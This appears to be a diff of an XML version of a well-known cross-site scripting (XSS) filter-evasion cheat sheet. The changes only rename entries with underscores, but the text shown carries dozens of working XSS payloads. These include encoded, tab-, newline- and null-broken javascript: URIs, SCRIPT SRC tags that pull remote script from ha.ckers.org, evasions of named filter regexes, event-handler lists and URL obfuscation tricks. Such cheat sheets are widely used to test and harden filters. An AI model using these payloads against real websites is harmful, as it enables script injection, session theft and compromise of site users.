 		<desc>Escaping JavaScript escapes. When the application is written to output some user information inside of a JavaScript like the following: &lt;SCRIPT&gt;var a=&quot;$ENV{QUERY_STRING}&quot;;&lt;/SCRIPT&gt; and you want to inject your own JavaScript into it but the server side application escapes certain quotes you can circumvent that by escaping their escape character. When this is gets injected it will read &lt;SCRIPT&gt;var a=&quot;&quot;;alert(&apos;XSS&apos;);//&quot;;&lt;/SCRIPT&gt; which ends up un-escaping the double quote and causing the Cross Site Scripting vector to fire.</desc>
 
@@ -716,7 +716,7 @@ echo(&apos;IPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&apos;); ?&gt;</code>
 
 	</attack>
 	<attack>
-		<name>End title tag</name>
+		<name>End_title_tag</name>
 		<code>&lt;/TITLE&gt;&lt;SCRIPT&gt;alert("XSS");&lt;/SCRIPT&gt;</code>
 		<desc>This is a simple XSS vector that closes TITLE tags, which can encapsulate the malicious cross site scripting attack.</desc>
 		<label>Character Encoding Attacks</label>
@@ -725,7 +725,7 @@ echo(&apos;IPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&apos;); ?&gt;</code>
 
 	</attack>
 	<attack>
-		<name>STYLE w/broken up JavaScript</name>
+		<name>STYLE_w/broken_up_JavaScript</name>
 		<code>&lt;STYLE&gt;@im\port&apos;\ja\vasc\ript:alert(&quot;XSS&quot;)&apos;;&lt;/STYLE&gt;</code>
 		<desc>STYLE tags with broken up JavaScript for XSS (this XSS at times sends IE into an infinite loop of alerts).</desc>
 
@@ -734,7 +734,7 @@ echo(&apos;IPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&apos;); ?&gt;</code>
 
 	</attack>
 	<attack>
-		<name>Embedded Tab</name>
+		<name>Embedded_Tab</name>
 		<code>&lt;IMG SRC=&quot;jav&#x09;ascript:alert(&apos;XSS&apos;);&quot;&gt;</code>
 		<desc>Embedded tab to break up the cross site scripting attack.</desc>
 
@@ -743,7 +743,7 @@ echo(&apos;IPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&apos;); ?&gt;</code>
 
 	</attack>
 	<attack>
-		<name>Embedded Encoded Tab</name>
+		<name>Embedded_Encoded_Tab</name>
 		<code>&lt;IMG SRC=&quot;jav&amp;#x09;ascript:alert(&apos;XSS&apos;);&quot;&gt;</code>
 		<desc>Embedded encoded tab to break up XSS.  For some reason Opera does not allow the encoded tab, but it does allow the previous tab XSS and encoded newline and carriage returns below.</desc>
 
@@ -752,7 +752,7 @@ echo(&apos;IPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&apos;); ?&gt;</code>
 
 	</attack>
 	<attack>
-		<name>Embedded Newline</name>
+		<name>Embedded_Newline</name>
 		<code>&lt;IMG SRC=&quot;jav&amp;#x0A;ascript:alert(&apos;XSS&apos;);&quot;&gt;</code>
 		<desc>Embedded newline to break up XSS. Some websites claim that any of the chars 09-13 (decimal) will work for this attack. That is incorrect. Only 09 (horizontal tab), 10 (newline) and 13 (carriage return) work.</desc>
 
@@ -761,7 +761,7 @@ echo(&apos;IPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&apos;); ?&gt;</code>
 
 	</attack>
 	<attack>
-		<name>Embedded Carriage Return</name>
+		<name>Embedded_Carriage_Return</name>
 		<code>&lt;IMG SRC=&quot;jav&amp;#x0D;ascript:alert(&apos;XSS&apos;);&quot;&gt;</code>
 		<desc>Embedded carriage return to break up XSS (Note: with the above I am making these strings longer than they have to be because the zeros could be omitted. Often I&apos;ve seen filters that assume the hex and dec encoding has to be two or three characters. The real rule is 1-7 characters).</desc>
 
@@ -770,7 +770,7 @@ echo(&apos;IPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&apos;); ?&gt;</code>
 
 	</attack>
 	<attack>
-		<name>Multiline w/Carriage Returns</name>
+		<name>Multiline_w/Carriage_Returns</name>
 		<code>&lt;IMG&#x0D;SRC&#x0D;=&#x0D;&quot;&#x0D;j&#x0D;a&#x0D;v&#x0D;a&#x0D;s&#x0D;c&#x0D;r&#x0D;i&#x0D;p&#x0D;t&#x0D;:&#x0D;a&#x0D;l&#x0D;e&#x0D;r&#x0D;t&#x0D;(&#x0D;&apos;&#x0D;X&#x0D;S&#x0D;S&#x0D;&apos;&#x0D;)&#x0D;&quot;&#x0D;&gt;&#x0D;</code>
 
 		<desc>Multiline Injected JavaScript using ASCII carriage returns (same as above only a more extreme example of this XSS vector).</desc>
@@ -779,7 +779,7 @@ echo(&apos;IPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&apos;); ?&gt;</code>
 
 	</attack>
 	<attack>
-		<name>Null Chars 1</name>
+		<name>Null_Chars_1</name>
 		<code>perl -e &apos;print &quot;&lt;IMG SRC=java\0script:alert(&quot;XSS&quot;)>&quot;;&apos;&gt; out</code>
 
 		<desc>Okay, I lied, null chars also work as XSS vectors but not like above, you need to inject them directly using something like Burp Proxy (http://www.portswigger.net/proxy/) or use %00 in the URL string or if you want to write your own injection tool you can use Vim (^V^@ will produce a null) to generate it into a text file.  Okay, I lied again, older versions of Opera (circa 7.11 on Windows) were vulnerable to one additional char 173 (the soft hyphen control char). But the null char %00 is much more useful and helped me bypass certain real world filters with a variation on this example.</desc>
@@ -788,7 +788,7 @@ echo(&apos;IPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&apos;); ?&gt;</code>
 
 	</attack>
 	<attack>
-		<name>Null Chars 2</name>
+		<name>Null_Chars_2</name>
 		<code>perl -e &apos;print &quot;&amp;&lt;SCR\0IPT&gt;alert(&quot;XSS&quot;)&lt;/SCR\0IPT&gt;&quot;;&apos; &gt; out</code>
 
 		<desc>Here is a little known XSS attack vector using null characters.  You can actually break up the HTML itself using the same nulls as shown above. I&apos;ve seen this vector bypass some of the most restrictive XSS filters to date</desc>
@@ -797,7 +797,7 @@ echo(&apos;IPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&apos;); ?&gt;</code>
 
 	</attack>
 	<attack>
-		<name>Spaces/Meta Chars</name>
+		<name>Spaces/Meta_Chars</name>
 		<code>&lt;IMG SRC=&quot; &amp;#14;  javascript:alert(&apos;XSS&apos;);&quot;&gt;</code>
 		<desc>Spaces and meta chars before the JavaScript in images for XSS (this is useful if the pattern match doesn&apos;t take into account spaces in the word &quot;javascript:&quot; - which is correct since that won&apos;t render- and makes the false assumption that you can&apos;t have a space between the quote and the &quot;javascript:&quot; keyword. The actual reality is you can have any char from 1-32 in decimal).</desc>
 
@@ -815,7 +815,7 @@ echo(&apos;IPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&apos;); ?&gt;</code>
 
 	</attack>
 	<attack>
-		<name>Non-Alpha/Non-Digit Part 2</name>
+		<name>Non-Alpha/Non-Digit_Part_2</name>
 		<code>&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert(&quot;XSS&quot;)&gt;</code>
 		<desc>Non-alpha-non-digit XSS part 2.  yawnmoth brought my attention to this vector, based on the same idea as above, however, I expanded on it, using my fuzzer. The Gecko rendering engine allows for any character other than letters, numbers or encapsulation chars (like quotes, angle brackets, etc...) between the event handler and the equals sign, making it easier to bypass cross site scripting blocks. Note that this does not apply to the grave accent char as seen here.</desc>
 		<label>Embedded Character Attacks</label>
@@ -824,7 +824,7 @@ echo(&apos;IPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&apos;); ?&gt;</code>
 
 	</attack>
 	<attack>
-		<name>No Closing Script Tag</name>
+		<name>No_Closing_Script_Tag</name>
 		<code>&lt;SCRIPT SRC=http://ha.ckers.org/xss.js</code>
 		<desc>In Firefox and Netscape 8.1 in the Gecko rendering engine mode you don&apos;t actually need the &quot;&gt;&lt;/SCRIPT&gt;&quot; portion of this Cross Site Scripting vector. Firefox assumes it&apos;s safe to close the HTML tag and add closing tags for you. How thoughtful! Unlike the next one, which doesn&apos;t affect Firefox, this does not require any additional HTML below it. You can add quotes if you need to, but they&apos;re not needed generally.</desc>
 
@@ -833,7 +833,7 @@ echo(&apos;IPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&apos;); ?&gt;</code>
 
 	</attack>
 	<attack>
-		<name>Protocol resolution in script tags</name>
+		<name>Protocol_resolution_in_script_tags</name>
 		<code>&lt;SCRIPT SRC=//ha.ckers.org/.j&gt;</code>
 		<desc>This particular variant was submitted by Lukasz Pilorz and was based partially off of Ozh&apos;s protocol resolution bypass below. This cross site scripting example works in IE, Netscape in IE rendering mode and Opera if you add in a &lt;/SCRIPT&gt; tag at the end. However, this is especially useful where space is an issue, and of course, the shorter your domain, the better. The &quot;.j&quot; is valid, regardless of the MIME type because the browser knows it in context of a SCRIPT tag.</desc>
 
@@ -842,7 +842,7 @@ echo(&apos;IPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&apos;); ?&gt;</code>
 
 	</attack>
 	<attack>
-		<name>Half-Open HTML/JavaScript</name>
+		<name>Half-Open_HTML/JavaScript</name>
 		<code>&lt;IMG SRC=&quot;javascript:alert(&apos;XSS&apos;)&quot;</code>
 		<desc>Unlike Firefox, the IE rendering engine doesn&apos;t add extra data to your page, but it does allow the &quot;javascript:&quot; directive in images. This is useful as a vector because it doesn&apos;t require a close angle bracket. This assumes that there is at least one HTML tag below where you are injecting this cross site scripting vector. Even though there is no close &gt; tag the tags below it will close it. A note: this does mess up the HTML, depending on what HTML is beneath it. See http://www.blackhat.com/presentations/bh-usa-04/bh-us-04-mookhey/bh-us-04-mookhey-up.ppt for more info. It gets around the following NIDS regex:
 	/((\%3D)|(=))[^\n]*((\%3C)|&lt;)[^\n]+((\%3E)|>)/
@@ -853,7 +853,7 @@ As a side note, this was also effective against a real world XSS filter I came a
 
 	</attack>
 	<attack>
-		<name>Double open angle brackets</name>
+		<name>Double_open_angle_brackets</name>
 		<code>&lt;IFRAME SRC=http://ha.ckers.org/scriptlet.html &lt;</code>
 		<desc>This is an odd one that Steven Christey brought to my attention. At first I misclassified this as the same XSS vector as above but it&apos;s surprisingly different. Using an open angle bracket at the end of the vector instead of a close angle bracket causes different behavior in Netscape Gecko rendering. Without it, Firefox will work but Netscape won&apos;t</desc>
 		<label>Embedded Character Attacks</label>
@@ -862,25 +862,25 @@ As a side note, this was also effective against a real world XSS filter I came a
 
 	</attack>
 	<attack>
-		<name>Extraneous Open Brackets</name>
+		<name>Extraneous_Open_Brackets</name>
 		<code>&lt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;);//&lt;&lt;/SCRIPT&gt;</code>
 		<desc>(Submitted by Franz Sedlmaier http://www.pilorz.net/).  This XSS vector could defeat certain detection engines that work by first using matching pairs of open and close angle brackets and then by doing a comparison of the tag inside, instead of a more efficient algorythm like Boyer-Moore (http://www.cs.utexas.edu/users/moore/best-ideas/string-searching/) that looks for entire string matches of the open angle bracket and associated tag (post de-obfuscation, of course).  The double slash comments out the ending extraneous bracket to supress a JavaScript error.</desc>
 
-		<label>Embedded Character Attacks</label>
+		<label>Embedded_Character_Attacks</label>
 		<browser>Browser support: [&lt;span class=&quot;s&quot;&gt;IE6.0&lt;/span&gt;|&lt;span class=&quot;s&quot;&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class=&quot;s&quot;&gt;NS8.1-G&lt;/span&gt;|&lt;span class=&quot;s&quot;&gt;FF1.5&lt;/span&gt;] [&lt;span class=&quot;s&quot;&gt;O8.54&lt;/span&gt;]</browser>
 
 	</attack>
 	<attack>
-		<name>Malformed IMG Tags</name>
+		<name>Malformed_IMG_Tags</name>
 		<code>&lt;IMG &quot;&quot;&quot;&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&quot;&gt;</code>
 		<desc>Originally found by Begeek (http://www.begeek.it/2006/03/18/esclusivo-vulnerabilita-xss-in-firefox/#more-300 - cleaned up and shortened to work in all browsers), this XSS vector uses the relaxed rendering engine to create our XSS vector within an IMG tag that should be encapsulated within quotes.  I assume this was originally meant to correct sloppy coding.  This would make it significantly more difficult to correctly parse apart an HTML tag.</desc>
 
-		<label>Embedded Character Attacks</label>
+		<label>Embedded_Character_Attacks</label>
 		<browser>Browser support: [&lt;span class=&quot;s&quot;&gt;IE6.0&lt;/span&gt;|&lt;span class=&quot;s&quot;&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class=&quot;s&quot;&gt;NS8.1-G&lt;/span&gt;|&lt;span class=&quot;s&quot;&gt;FF1.5&lt;/span&gt;] [&lt;span class=&quot;s&quot;&gt;O8.54&lt;/span&gt;]</browser>
 
 	</attack>
 	<attack>
-		<name>No Quotes/Semicolons</name>
+		<name>No_Quotes/Semicolons</name>
 		<code>&lt;SCRIPT&gt;a=/XSS/
 alert(a.source)&lt;/SCRIPT&gt;</code>
 		<desc>No single quotes or double quotes or semicolons.</desc>
@@ -890,7 +890,7 @@ alert(a.source)&lt;/SCRIPT&gt;</code>
 
 	</attack>
 	<attack>
-		<name>Event Handlers List 1</name>
+		<name>Event_Handlers_List_1</name>
 		<code>See Below</code>
 		<desc>Event Handlers that can be used in XSS attacks (this is the most comprehensive list on the net, at the time of this writing). Each one may have different results in different browsers. Thanks to Rene Ledosquet (http://www.secaron.de/) for the HTML+TIME updates:
 
@@ -969,7 +969,7 @@ alert(a.source)&lt;/SCRIPT&gt;</code>
 		<browser>Browser support:</browser>
 	</attack>
 	<attack>
-		<name>Event Handlers List 2</name>
+		<name>Event_Handlers_List_2</name>
 		<code>See Below</code>
 
 		<desc>-onEnd() (fires when the timeline ends.  This can be exploited, like most of the HTML+TIME event handlers by doing something like &lt;P STYLE=&quot;behavior:url(&apos;#default#time2&apos;)&quot; onEnd=&quot;alert(&apos;XSS&apos;)&quot;&gt;)
@@ -1045,7 +1045,7 @@ alert(a.source)&lt;/SCRIPT&gt;</code>
 		<browser>Browser support:</browser>
 	</attack>
 	<attack>
-		<name>Event Handlers List 3</name>
+		<name>Event_Handlers_List_3</name>
 		<code>See Below</code>
 		<desc>-onRepeat() (fires once for each repetition of the timeline, excluding the first full cycle)
 
@@ -1102,7 +1102,7 @@ alert(a.source)&lt;/SCRIPT&gt;</code>
 		<browser>Browser support:</browser>
 	</attack>
 	<attack>
-		<name>Evade Regex Filter 1</name>
+		<name>Evade_Regex_Filter_1</name>
 		<code>&lt;SCRIPT a=&quot;&gt;&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;</code>
 
 		<desc>For performing XSS on sites that allow &quot;&lt;SCRIPT>&quot; but don&apos;t allow &quot;&lt;SCRIPT SRC...&quot; by way of the following regex filter:
@@ -1112,7 +1112,7 @@ alert(a.source)&lt;/SCRIPT&gt;</code>
 
 	</attack>
 	<attack>
-		<name>Evade Regex Filter 2</name>
+		<name>Evade_Regex_Filter_2</name>
 		<code>&lt;SCRIPT =&quot;blah&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;</code>
 		<desc>For performing XSS on sites that allow &quot;&lt;SCRIPT>&quot; but don&apos;t allow &quot;&lt;SCRIPT SRC...&quot; by way of a regex filter:
 	/&lt;script((\s+\w+(\s*=\s*(?:&quot;(.)*?&quot;|&apos;(.)*?&apos;|[^&apos;&quot;&gt;\s]+))?)+\s*|\s*)src/i
@@ -1124,7 +1124,7 @@ alert(a.source)&lt;/SCRIPT&gt;</code>
 
 	</attack>
 	<attack>
-		<name>Evade Regex Filter 3</name>
+		<name>Evade_Regex_Filter_3</name>
 		<code>&lt;SCRIPT a=&quot;blah&quot; &apos;&apos; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;</code>
 		<desc>Another XSS to evade this regex filter:
 	/&lt;script((\s+\w+(\s*=\s*(?:&quot;(.)*?&quot;|&apos;(.)*?&apos;|[^&apos;&quot;&gt;\s]+))?)+\s*|\s*)src/i</desc>
@@ -1134,7 +1134,7 @@ alert(a.source)&lt;/SCRIPT&gt;</code>
 
 	</attack>
 	<attack>
-		<name>Evade Regex Filter 4</name>
+		<name>Evade_Regex_Filter_4</name>
 		<code>&lt;SCRIPT &quot;a=&apos;&gt;&apos;&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;</code>
 		<desc>Yet another XSS to evade the same filter:
 	/&lt;script((\s+\w+(\s*=\s*(?:&quot;(.)*?&quot;|&apos;(.)*?&apos;|[^&apos;&quot;&gt;\s]+))?)+\s*|\s*)src/i
@@ -1145,7 +1145,7 @@ The only thing I&apos;ve seen work against this XSS attack if you still want to 
 
 	</attack>
 	<attack>
-		<name>Evade Regex Filter 5</name>
+		<name>Evade_Regex_Filter_5</name>
 		<code>&lt;SCRIPT a=`&gt;` SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;</code>
 		<desc>And one last XSS attack (using grave accents) to evade this regex:
 	/&lt;script((\s+\w+(\s*=\s*(?:&quot;(.)*?&quot;|&apos;(.)*?&apos;|[^&apos;&quot;&gt;\s]+))?)+\s*|\s*)src/i</desc>
@@ -1155,7 +1155,7 @@ The only thing I&apos;ve seen work against this XSS attack if you still want to 
 
 	</attack>
 	<attack>
-		<name>Filter Evasion 1</name>
+		<name>Filter_Evasion_1</name>
 		<code>&lt;SCRIPT&gt;document.write(&quot;&lt;SCRI&quot;);&lt;/SCRIPT&gt;PT SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;</code>
 
 		<desc>This XSS still worries me, as it would be nearly impossible to stop this without blocking all active content.</desc>
@@ -1164,7 +1164,7 @@ The only thing I&apos;ve seen work against this XSS attack if you still want to 
 
 	</attack>
 	<attack>
-		<name>Filter Evasion 2</name>
+		<name>Filter_Evasion_2</name>
 		<code>&lt;SCRIPT a=&quot;>&apos;>&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;</code>
 		<desc>Here&apos;s an XSS example that bets on the fact that the regex won&apos;t catch a matching pair of quotes but will rather find any quotes to terminate a parameter string improperly.</desc>
 
@@ -1173,7 +1173,7 @@ The only thing I&apos;ve seen work against this XSS attack if you still want to 
 
 	</attack>
 	<attack>
-		<name>IP Encoding</name>
+		<name>IP_Encoding</name>
 		<code>&lt;A HREF=&quot;http://66.102.7.147/&quot;&gt;XSS&lt;/A&gt;</code>
 		<desc>URL string evasion (assuming &quot;http://www.google.com/&quot; is programmatically disallowed).</desc>
 
@@ -1182,7 +1182,7 @@ The only thing I&apos;ve seen work against this XSS attack if you still want to 
 
 	</attack>
 	<attack>
-		<name>URL Encoding</name>
+		<name>URL_Encoding</name>
 		<code>&lt;A HREF=&quot;http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D&quot;&gt;XSS&lt;/A&gt;</code>
 		<desc>URL string evasion (assuming &quot;http://www.google.com/&quot; is programmatically disallowed).</desc>
 
@@ -1191,7 +1191,7 @@ The only thing I&apos;ve seen work against this XSS attack if you still want to 
 
 	</attack>
 	<attack>
-		<name>Dword Encoding</name>
+		<name>Dword_Encoding</name>
 		<code>&lt;A HREF=&quot;http://1113982867/&quot;&gt;XSS&lt;/A&gt;</code>
 		<desc>URL string evasion (assuming &quot;http://www.google.com/&quot; is programmatically disallowed).</desc>
 
@@ -1200,7 +1200,7 @@ The only thing I&apos;ve seen work against this XSS attack if you still want to 
 
 	</attack>
 	<attack>
-		<name>Hex Encoding</name>
+		<name>Hex_Encoding</name>
 		<code>&lt;A HREF=&quot;http://0x42.0x0000066.0x7.0x93/&quot;&gt;XSS&lt;/A&gt;</code>
 		<desc>URL string evasion (assuming &quot;http://www.google.com/&quot; is programmatically disallowed).
 The total size of each number allowed is somewhere in the neighborhood of 240 total characters as you can see on the second digit, and since the hex number is between 0 and F the leading zero on the third hex digit is not required.</desc>
@@ -1210,7 +1210,7 @@ The total size of each number allowed is somewhere in the neighborhood of 240 to
 
 	</attack>
 	<attack>
-		<name>Octal Encoding</name>
+		<name>Octal_Encoding</name>
 		<code>&lt;A HREF=&quot;http://0102.0146.0007.00000223/&quot;&gt;XSS&lt;/A&gt;</code>
 		<desc>URL string evasion (assuming &quot;http://www.google.com/&quot; is programmatically disallowed).
 Padding is allowed, although you must keep it above 4 total characters per class - as in class A, class B, etc...</desc>
@@ -1220,7 +1220,7 @@ Padding is allowed, although you must keep it above 4 total characters per class
 
 	</attack>
 	<attack>
-		<name>Mixed Encoding</name>
+		<name>Mixed_Encoding</name>
 		<code>&lt;A HREF=&quot;h&#x0A;tt&#09;p://6&amp;#09;6.000146.0x7.147/&quot;&gt;XSS&lt;/A&gt;</code>
 		<desc>URL string evasion (assuming &quot;http://www.google.com/&quot; is programmatically disallowed).
 The tabs and newlines only work if this is encapsulated with quotes.</desc>
@@ -1230,7 +1230,7 @@ The tabs and newlines only work if this is encapsulated with quotes.</desc>
 
 	</attack>
 	<attack>
-		<name>Protocol Resolution Bypass</name>
+		<name>Protocol_Resolution_Bypass</name>
 		<code>&lt;A HREF=&quot;//www.google.com/&quot;&gt;XSS&lt;/A&gt;</code>
 		<desc>URL string evasion (assuming &quot;http://www.google.com/&quot; is programmatically disallowed).
 Protocol resolution bypass (// translates to http:// which saves a few more bytes). This is really handy when space is an issue too (two less characters can go a long way) and can easily bypass regex like &quot;(ht|f)tp(s)?://&quot; (thanks to Ozh (http://planetOzh.com/) for part of this one). You can also change the &quot;//&quot; to &quot;\\&quot;. You do need to keep the slashes in place, however, otherwise this will be interpreted as a relative path URL.</desc>
@@ -1240,7 +1240,7 @@ Protocol resolution bypass (// translates to http:// which saves a few more byte
 
 	</attack>
 	<attack>
-		<name>Firefox Lookups 1</name>
+		<name>Firefox_Lookups_1</name>
 		<code>&lt;A HREF=&quot;//google&quot;&gt;XSS&lt;/A&gt;</code>
 		<desc>Firefox uses Google&apos;s &quot;feeling lucky&quot; function to redirect the user to any keywords you type in. So if your exploitable page is the top for some random keyword (as you see here) you can use that feature against any Firefox user. This uses Firefox&apos;s &quot;keyword:&quot; protocol. You can concatenate several keywords by using something like the following &quot;keyword:XSS+RSnake&quot;</desc>
 
@@ -1249,16 +1249,16 @@ Protocol resolution bypass (// translates to http:// which saves a few more byte
 
 	</attack>
 	<attack>
-		<name>Firefox Lookups 2</name>
+		<name>Firefox_Lookups_2</name>
 		<code>&lt;A HREF=&quot;http://ha.ckers.org@google&quot;&gt;XSS&lt;/A&gt;</code>
 		<desc>This uses a very tiny trick that appears to work Firefox only, because if it&apos;s implementation of the &quot;feeling lucky&quot; function.  Unlike the next one this does not work in Opera because Opera believes that this is the old HTTP Basic Auth phishing attack, which it is not.  It&apos;s simply a malformed URL.  If you click okay on the dialogue it will work, but as a result of the erroneous dialogue box I am saying that this is not supported in Opera.</desc>
 
-		<label>URL Obfuscation</label>
+		<label>URL_Obfuscation</label>
 		<browser>Browser support: [&lt;span class=&quot;ns&quot;&gt;IE6.0&lt;/span&gt;|&lt;span class=&quot;ns&quot;&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class=&quot;s&quot;&gt;NS8.1-G&lt;/span&gt;|&lt;span class=&quot;s&quot;&gt;FF1.5&lt;/span&gt;] [&lt;span class=&quot;ns&quot;&gt;O8.54&lt;/span&gt;]</browser>
 
 	</attack>
 	<attack>
-		<name>Firefox Lookups 3</name>
+		<name>Firefox_Lookups_3</name>
 		<code>&lt;A HREF=&quot;http://google:ha.ckers.org&quot;&gt;XSS&lt;/A&gt;</code>
 		<desc>This uses a malformed URL that appears to work in Firefox and Opera only, because if their implementation of the &quot;feeling lucky&quot; function.  Like all of the above it requires that you are #1 in Google for the keyword in question (in this case &quot;google&quot;).</desc>
 
@@ -1267,7 +1267,7 @@ Protocol resolution bypass (// translates to http:// which saves a few more byte
 
 	</attack>
 	<attack>
-		<name>Removing Cnames</name>
+		<name>Removing_Cnames</name>
 		<code>&lt;A HREF=&quot;http://google.com/&quot;&gt;XSS&lt;/A&gt;</code>
 		<desc>URL string evasion (assuming &quot;http://www.google.com/&quot; is programmatically disallowed).
 When combined with the above URL, removing &quot;www.&quot; will save an additional 4 bytes for a total byte savings of 9 for servers that have this set up properly.</desc>
@@ -1277,7 +1277,7 @@ When combined with the above URL, removing &quot;www.&quot; will save an additio
 
 	</attack>
 	<attack>
-		<name>Extra dot for Absolute DNS</name>
+		<name>Extra_dot_for_Absolute_DNS</name>
 		<code>&lt;A HREF=&quot;http://www.google.com./&quot;&gt;XSS&lt;/A&gt;</code>
 		<desc>URL string evasion (assuming &quot;http://www.google.com/&quot; is programmatically disallowed).</desc>
 
@@ -1286,7 +1286,7 @@ When combined with the above URL, removing &quot;www.&quot; will save an additio
 
 	</attack>
 	<attack>
-		<name>JavaScript Link Location</name>
+		<name>JavaScript_Link_Location</name>
 		<code>&lt;A HREF=&quot;javascript:document.location=&apos;http://www.google.com/&apos;&quot;&gt;XSS&lt;/A&gt;</code>
 		<desc>URL string evasion (assuming &quot;http://www.google.com/&quot; is programmatically disallowed)
 JavaScript link location</desc>
@@ -1296,7 +1296,7 @@ JavaScript link location</desc>
 
 	</attack>
 	<attack>
-		<name>Content Replace</name>
+		<name>Content_Replace</name>
 		<code>&lt;A HREF=&quot;http://www.gohttp://www.google.com/ogle.com/&quot;&gt;XSS&lt;/A&gt;</code>
 		<desc>Content replace as an attack vector (assuming &quot;http://www.google.com/&quot; is programmatically replaced with null). I actually used a similar attack vector against a several separate real world XSS filters by using the conversion filter itself (like http://quickwired.com/kallahar/smallprojects/php_xss_filter_function.php) to help create the attack vector (&quot;java&amp;#x26;#x09;script:&quot; was converted into &quot;java&amp;#x09;script:&quot;.</desc>
 
